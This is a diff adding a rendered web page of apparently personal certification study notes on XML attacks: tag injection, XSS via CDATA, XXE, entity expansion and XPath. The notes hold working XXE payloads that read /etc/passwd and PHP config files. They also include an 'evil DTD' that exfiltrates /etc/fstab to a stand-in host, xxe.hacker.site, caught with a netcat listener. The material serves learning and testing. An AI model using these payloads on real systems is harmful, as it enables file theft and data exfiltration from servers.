@@ -1,0 +1,1977 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>9 - XML Attacks |</title>
+<meta name="description" content="Tag Injection, XXE, Xpath Injection and More ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="9 - XML Attacks">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/xmlattacks/">
+
+
+  <meta property="og:description" content="Tag Injection, XXE, Xpath Injection and More ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-02T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/xmlattacks/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          9 - XML Attacks
+
+        
+      </h1>
+      
+        <p class="page__lead">Tag Injection, XXE, Xpath Injection and More
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  25 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/" class="active">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="9 - XML Attacks">
+    <meta itemprop="description" content="Tag Injection, XXE, Xpath Injection and More">
+    <meta itemprop="datePublished" content="2023-12-02T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#xml-attacks">XML Attacks</a>
+    <ul>
+      <li><a href="#introduction">Introduction</a></li>
+      <li><a href="#tagfragment-injection">Tag/Fragment Injection</a></li>
+      <li><a href="#texting-xml-injection">Texting XML Injection</a></li>
+      <li><a href="#xml-external-entity">XML External Entity</a></li>
+      <li><a href="#xml-entity-expansion-xee">XML Entity Expansion (XEE)</a></li>
+      <li><a href="#xpath-injection">XPath Injection</a></li>
+      <li><a href="#advanced-xpath-exploitation">Advanced XPath Exploitation</a></li>
+      <li><a href="#http-channel">HTTP Channel</a></li>
+      <li><a href="#note-from-video-1">Note from Video</a></li>
+      <li><a href="#lab-1">Lab 1</a></li>
+      <li><a href="#lab-2">Lab 2</a></li>
+      <li><a href="#lab-3">Lab 3</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="xml-attacks">XML Attacks</h1>
+
+<ul>
+  <li>XML Tag Injection</li>
+  <li>XML eXternal Entity</li>
+  <li>XML Entity Expansion</li>
+  <li>Xpath Injection</li>
+</ul>
+
+<h2 id="introduction">Introduction</h2>
+<p>There are many fields of use that leverage XML:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- PDF
+- RSS
+- OOXML
+- SVG
+- network protocols such XMLRPC, SOAP, WebDAV and many others
+</code></pre></div></div>
+
+<h3 id="recap">Recap</h3>
+
+<p>Technically, XML is derived from the SGML standard and is the same standard on which HTML is based, however, with a lightweight implementation. This means that some SGML-based features, such as unclosed end-closed tags, etc. Are not implemented</p>
+<ul>
+  <li>
+    <p>html5 standards is not SGML-based</p>
+  </li>
+  <li>
+    <p>Document Type Definition (DTD):</p>
+  </li>
+</ul>
+
+<p>Block of XML:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Elements
+- Tags
+- Attributes
+- Entities
+- PCDATA (Parsed Character Data)
+- CDATA
+</code></pre></div></div>
+
+<p>Entities Block:</p>
+
+<p>→ http://www.w3.org/TR/REC-xml/#sec-logical-struct</p>
+
+<ul>
+  <li>To allow For flexibility, the specifications have introduced physical structures</li>
+</ul>
+
+<p>→ http://www.w3.org/TR/REC-xml/#sec-physical-struct</p>
+
+<p><img src="/assets/images/posts/ewptx/4.png" alt="Alt text" class="align-center" /></p>
+
+<p>There are various types of entities, depending upon where they are declared, how reusable they are, and if they need to be parsed. They can be categorized, as follows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Internal/External
+- General/Parameter
+- Parsed/Unparsed
+</code></pre></div></div>
+
+<p>Only 5 entity category combinations are considered legal</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Internal
+General   + Parsed
+Parameter + Parsed
+
+# External
+General   + Parsed
+General   + Unparsed
+Parameter + Parsed
+</code></pre></div></div>
+<h3 id="generally-speaking-there-are-three-options">Generally speaking, there are three options</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- XML is tampered
+- XML document containing an attack is sent
+- XML is taken using a querying mechanism
+</code></pre></div></div>
+
+<h2 id="tagfragment-injection">Tag/Fragment Injection</h2>
+<p>In this scenario, thea attacker is able to alter the XML document structure by injecting both XML data and XML tags.</p>
+<ul>
+  <li>Lets assume a web app is using XML to store users and passwords</li>
+</ul>
+
+<p>If the user is able to inject some <strong>XML metacharacters</strong> within the document. The, if they app fails to contextually validate data, its vulnerable to XML Injection:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Metacharacters: ' " &lt; &gt; &amp;    '
+</code></pre></div></div>
+
+<p>How to test:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- We have to inject metacharacters, attempting to break some of the structures
+</code></pre></div></div>
+
+<h2 id="texting-xml-injection">Texting XML Injection</h2>
+
+<h3 id="singledouble-quotes">Single/Double Quotes</h3>
+<p>Single and Double quotes are used to define an attribute value in the tag:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">"id"</span><span class="nt">&gt;</span>admin<span class="nt">&lt;/group&gt;</span>  <span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">'id'</span><span class="nt">&gt;</span>admin<span class="nt">&lt;/group&gt;</span>
+</code></pre></div></div>
+
+<p>An <em>ID</em> like the following, will make the XML incorrect:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">"12"</span><span class="err">"</span><span class="nt">&gt;</span>admin<span class="nt">&lt;/group&gt;</span>  <span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">'12'</span><span class="err">'</span><span class="nt">&gt;</span>admin<span class="nt">&lt;/group&gt;</span>      "
+# duplicating the Quotes
+</code></pre></div></div>
+<h3 id="ampersand-">Ampersand &amp;</h3>
+<p>Its used to represent entities:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ni">&amp;EntityName;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>By injecting <strong>&amp;name;</strong>,  we can trigger an error if the entity is not defined. Additionaly, we can attempt to remove the final <strong>;</strong>, generating a malformed XML structure.</li>
+</ul>
+
+<h3 id="angular-parentheses">Angular Parentheses</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt; &gt;
+</code></pre></div></div>
+
+<p>Using angular parentheses, we can begin to define several areas within the XML document such as tag names, comments, and CDATA sections:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;tagname&gt;</span> <span class="c">&lt;!-- --&gt;</span> <span class="cp">&lt;![CDATA[value]]&gt;</span>
+</code></pre></div></div>
+
+<h3 id="xss-with-cdata">XSS with CDATA</h3>
+<p>We can also try exploiting the XML parser, thereby introducing both a possible XSS attack vector and possibly bypassing a weak filter.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="cp">&lt;![CDATA[alert]]&gt;</span>('XSS')<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>During XML processing, the CDATA section is eliminated, generating the infamous XSS payload</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>alert('XSS')<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Its possible to escape angular parentheses:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;![CDATA[&lt;]]&gt;</span>script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>alert('XSS')<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>/script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>
+</code></pre></div></div>
+
+<p>Equals:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>alert('XSS')<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<h2 id="xml-external-entity">XML External Entity</h2>
+<p>Consist of injecting external entities into the document definition; This type of attack is known as <strong>XXE</strong> (XML eXternal Entities)</p>
+
+<ul>
+  <li>In general, the idea is to tell XML parsers to load externally defined entities, therefore making it possible to access sensitive content stored on the vulnerable host.</li>
+</ul>
+
+<h3 id="taxonomy">Taxonomy</h3>
+<p>Two types:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Private 
+- Public
+</code></pre></div></div>
+
+<ul>
+  <li>Private external entities</li>
+  <li>Are restricted to either a single author or group of authors</li>
+</ul>
+
+<p>Public:</p>
+
+<p>Was designed For a broader usage:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY name SYSTEM "URI"&gt;</span> //private
+<span class="cp">&lt;!ENTITY name PUBLIC "PublicID" "URI"&gt;</span> //public
+</code></pre></div></div>
+
+<ul>
+  <li>Important to note that the URI field does not limit XML parses from resolving HTTPs protocols only</li>
+  <li>There are a number of valid <strong>URI schemes</strong> allowed (FILE, FTP, DNS, PHP, etc)</li>
+</ul>
+
+<p>→ http://en.wikipedia.org/wiki/URI_scheme</p>
+
+<p>With external entities, we can create <strong>dynamic references</strong> in the document</p>
+
+<ul>
+  <li>The most dangerous are the private ones, because they allow us to disclose local system files, play with network schemes, manipulate internal applications, etc.</li>
+</ul>
+
+<h3 id="resource-inclusion">Resource Inclusion</h3>
+<p>The attacker uploads/crafts a malicious XML file</p>
+
+<p>This includes an external entity definition that points to a local file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;</span>
+</code></pre></div></div>
+
+<p>Then in the body of the XML request, they add the reference to the created entity:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span><span class="ni">&amp;xxefile;</span><span class="nt">&lt;/body&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/5.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/6.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/7.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>Once the receiver reads the message, he will not only see the body of the message, but also the content of the external entity &amp;xxefile;(/etc/passwd file)</li>
+</ul>
+
+<h3 id="resource-inclusion---improved">Resource Inclusion - Improved</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; &lt; &gt; are special characters and will cause errors
+</code></pre></div></div>
+
+<ul>
+  <li>lets see more examples</li>
+</ul>
+
+<p>We want to access a php config file:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="o">&amp;</span><span class="n">config</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
+<span class="o">&amp;</span><span class="n">config</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'hiddenuser'</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="n">config</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'mysuperpassword'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In case we try to use the classic technique to extract the resource via XXE, 
+it will fail because is has special characters such as &gt; and &amp;
+</code></pre></div></div>
+
+<ul>
+  <li>even with <strong>[CDATA] bypass</strong> it will fail</li>
+</ul>
+
+<p>Parameters Entities</p>
+
+<p>→ https://www.w3.org/TR/xml/#dt-PE</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % name "value"&gt;</span>
+<span class="cp">&lt;!ENTITY % name SYSTEM "URI"&gt;</span>
+<span class="cp">&lt;!ENTITY % name PUBLIC "PublicID" "URI"&gt;</span>
+</code></pre></div></div>
+
+<h3 id="cdata-escape-using-parameter-entities">CDATA Escape Using Parameter Entities</h3>
+<p>By both using the CDATA bypass and Parameter Entities its possible to retrieve the resource content</p>
+
+<p><img src="/assets/images/posts/ewptx/8.png" alt="Alt text" class="align-center" /></p>
+
+<p>It works in major XML parsers</p>
+
+<p>But in PHP there is an alternative: Built-in Wrapper</p>
+
+<p>→ http://php.net/manual/en/wrappers.php.php</p>
+
+<h3 id="phpio-streams">php://I/O streams</h3>
+<p>→ php://filter</p>
+
+<p>This is a kind of meta-wrapper designed to convert the application filters to a stream at the time of opening</p>
+
+<p>→ http://php.net/manual/en/filters.php</p>
+
+<blockquote>
+  <p>In order to avoid XML parsing errors, we need a filter that reads the target file and then converts the content into a format that is harmless to the XML structure</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/9.png" alt="Alt text" class="align-center" /></p>
+
+<p>Base64:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php://filter/read=conver.base64-encode/resource=/path/to/config.php
+</code></pre></div></div>
+
+<h3 id="bypassing-access-controls">Bypassing Access Controls</h3>
+<p>Lets improve the previous PHP config file by adding an access restriction to a local server IP addresses</p>
+
+<p><img src="/assets/images/posts/ewptx/10.png" alt="Alt text" class="align-center" /></p>
+
+<p>If we attempt to access it from the web, an <strong>ACCESS DENIED</strong> page will be displayed</p>
+
+<ul>
+  <li>However, if the frontend is vulnerable to XXE, we can exploit the flaw and steal the page content.</li>
+</ul>
+
+<h3 id="out-of-band-data-retrieval">Out-of-Band Data Retrieval</h3>
+<p>This OOB technique we can use when we cant to extract file contents without any direct output.</p>
+
+<p><img src="/assets/images/posts/ewptx/11.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/12.png" alt="Alt text" class="align-center" /></p>
+
+<p>To assist in the exploitation of this technique:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/joernchen/xxeserve
+</code></pre></div></div>
+
+<p>Its an app that runs a server which is useful in collecting data sent out of band</p>
+
+<p>*example using XXEServe in images</p>
+
+<h3 id="note-from-video">Note from Video</h3>
+
+<h4 id="1">1</h4>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE test [
+&lt;!ENTITY fakeEntity SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+...
+<span class="err">&amp;</span>fakeEntity
+</code></pre></div></div>
+
+<h4 id="2">2</h4>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE test [
+&lt;!ENTITY fakeEntity SYSTEM "http://hacker.site:1337/XXE_OOB_TEST"&gt;</span>
+]&gt;
+
+...
+<span class="err">&amp;</span>fakeEntity
+</code></pre></div></div>
+
+<p>in kali:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat <span class="nt">-lvnp</span> 1337 <span class="nt">-k</span> <span class="nt">-w</span> 1
+</code></pre></div></div>
+
+<p>Grab the xxeserver from github</p>
+
+<p>Add these lines:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set</span> :bind, <span class="s2">"xxe.hacker.site"</span>
+<span class="nb">set</span> :port, 80
+</code></pre></div></div>
+
+<h3 id="evil-dtd">evil DTD</h3>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % resource SYSTEM "php://filter/read=conver.base64-encode/resource=file:///etc/fstab"&gt;</span>
+<span class="cp">&lt;!ENTITY % LoadOOBEnt "&lt;!ENTITY &amp;#x25; OOB SYSTEM 'http://xxe.hacker.site/?p=%resource;'&gt;</span> "&gt;
+</code></pre></div></div>
+
+<h3 id="evil-xml">evil XML</h3>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE XXE_OOB [
+  &lt;!ENTITY % EvilDTD SYSTEM "http://hacker.site/evil.dtd"&gt;</span>
+  %EvilDTD; 
+  %LoadOOBEnt; // the entity that defines a new entity
+  %OOB; // entity that performs the OOB communication
+]&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>dont forget to open the xxeserver 
+The space must be changed to + sign before it can be base64 decoded</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> &lt;file&gt; | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'+'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<h2 id="xml-entity-expansion-xee">XML Entity Expansion (XEE)</h2>
+<p>Its a <strong>Denial of Service</strong> Attack</p>
+
+<h3 id="recursive-entity-expansion">Recursive Entity Expansion</h3>
+<p>The most well-known XEE attack: <strong>Billion Laughs</strong></p>
+
+<ul>
+  <li>The attack exploits XML parsers into exponentially resolving sets of small entities.</li>
+</ul>
+
+<blockquote>
+  <p>This is done in order to explode the data from a simple <strong>lol</strong> string to a billion <strong>lol</strong> strings</p>
+</blockquote>
+
+<h3 id="billion-laughs-attack">Billion Laughs Attack</h3>
+
+<p><img src="/assets/images/posts/ewptx/13.png" alt="Alt text" class="align-center" /></p>
+
+<p>This attack can grow to approximately 3GB of memory</p>
+
+<blockquote>
+  <p>Thats quite a large amount of memory utilization and obviously quite devastating</p>
+</blockquote>
+
+<h3 id="generic-entity-expansion">Generic Entity Expansion</h3>
+<p>Another DoS attack is the <strong>Quadratic Blowup Attack</strong></p>
+
+<p><img src="/assets/images/posts/ewptx/14.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>We can obfuscate this malicious attack by moving the entities definition from the local DTD to an external one.</p>
+</blockquote>
+
+<p>Obfuscating:</p>
+
+<p><img src="/assets/images/posts/ewptx/15.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="xpath-injection">XPath Injection</h2>
+<p>Must be known before playing with other parallel languages, such as:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- XQuery
+- XSLT
+- Xlink
+- XPointer
+</code></pre></div></div>
+
+<blockquote>
+  <p>XPath is regarded as the SQL For querying XML databases</p>
+</blockquote>
+
+<h3 id="xpath-recap">XPath Recap</h3>
+<p>XPath allows us to navigate around the XML tree structure so that we can retrieve a list of nodes, an atomic value, or any sequence allowed by the data model that respects the searching criteria.</p>
+
+<h3 id="new-operations-and-expressions-on-sequences">New Operations and Expressions on Sequences</h3>
+<p>The most signigicant keyword: <strong>SEQUENCE</strong></p>
+
+<p>→ http://www.w3.org/TR/xpath-functions/</p>
+
+<p>Sequence is an ordered collection of zero or more items. An item is either a node or an atomic value. A node is an instance of one of the node kinds defined in Data Model.</p>
+
+<ul>
+  <li>Every XPath expression returns a sequence. This is an ordered grouping of atomic values or nodes with duplicates permitted.</li>
+</ul>
+
+<h3 id="function-on-strings">Function on Strings</h3>
+<p><strong>upper-case</strong> and <strong>lower-case</strong> are useful during detection phase, especially if we dont know the XPath version used.</p>
+<ul>
+  <li>If we are able to produce a positive output, then the function exists, therefore making it version 2.0</li>
+</ul>
+
+<p>If a negative output is produced, then its version 1.0</p>
